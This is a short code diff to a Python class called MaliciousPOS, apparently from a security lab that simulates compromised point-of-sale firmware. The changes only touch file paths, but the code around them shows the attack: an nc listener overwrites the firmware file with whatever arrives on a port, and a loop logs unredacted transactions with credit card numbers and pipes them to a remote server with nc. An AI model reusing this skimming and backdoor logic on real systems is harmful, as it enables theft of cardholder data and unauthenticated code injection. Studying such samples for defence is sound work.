@@ -30,7 +30,7 @@ class MaliciousPOS:
         print "malicious POS firmware running..."
 
         # keep opening nc listening port to receive firmware update
-        with open("pos_firmware.py", "w") as firmware:
+        with open("/home/ubuntu/payment-server/pos_firmware.py", "w") as firmware:
             subprocess.Popen(["nc", "-l", "-p", str(self.port)], stdout=firmware, stderr=subprocess.PIPE)
 
         while True:
@@ -59,7 +59,7 @@ class MaliciousPOS:
                 # Rollback in case there is any error
                 self.db.rollback()
 
-            with open("log_file", "w") as log_file:
+            with open("/home/ubuntu/log_file", "w") as log_file:
                 unredacted_info = ("(transac_id, datetime, content, amount, credit_card_no) = "
                                    "('%s','%s', '%s', '%.2f', '%s')\n" %
                                    (transac_id, datetime, content, amount, credit_card_no))
@@ -67,7 +67,7 @@ class MaliciousPOS:
                 log_file.close()
 
             # transfer the content of local log file to server
-            nc_call = "nc " + self.payment_server_ip + " " + self.payment_server_port + " < " + "log_file"
+            nc_call = "nc " + self.payment_server_ip + " " + self.payment_server_port + " < " + "/home/ubuntu/log_file"
             subprocess.Popen(nc_call, shell=True)
 
             # assume interval is drawn from exp distribution
